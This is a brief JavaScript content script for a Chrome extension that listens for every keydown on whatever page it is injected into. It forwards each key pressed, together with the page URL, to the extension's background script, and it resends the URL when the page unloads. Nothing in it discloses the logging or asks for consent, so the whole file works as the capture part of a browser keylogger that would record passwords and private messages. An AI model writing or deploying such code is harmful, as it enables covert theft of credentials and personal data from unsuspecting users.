// Variable to store the current site URL
let currentSiteUrl = location.href;

// Send site information when the content script is injected
chrome.runtime.sendMessage({ type: "site", data: currentSiteUrl });

// Listen for keystroke events
document.addEventListener("keydown", function(event) {
  chrome.runtime.sendMessage({ type: "keystroke", data: event.key, site: currentSiteUrl });
});

// Listen for page navigation events to ensure site information is sent reliably
window.addEventListener("beforeunload", function() {
  // Check if the current site URL is set before sending the message
  if (currentSiteUrl) {
    chrome.runtime.sendMessage({ type: "site", data: currentSiteUrl });
  }
});
